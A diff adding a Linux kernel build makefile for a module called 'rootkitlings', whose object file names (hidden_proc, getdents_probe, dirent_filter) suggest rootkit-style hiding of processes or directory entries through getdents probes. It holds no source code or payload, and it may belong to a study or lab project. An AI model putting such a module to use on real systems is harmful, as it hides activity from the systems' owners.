@@ -1,0 +1,8 @@
+ROOTKITLINGS_FAIL_POINT ?= 0
+
+obj-m += rootkitlings.o
+rootkitlings-y := core/main.o core/state.o interface/proc.o interface/hidden_proc.o \
+	instrumentation/probes.o instrumentation/getdents_probe.o \
+	instrumentation/dirent_filter.o
+ccflags-y += -I$(src)/include
+ccflags-y += -DROOTKITLINGS_FAIL_POINT=$(ROOTKITLINGS_FAIL_POINT)
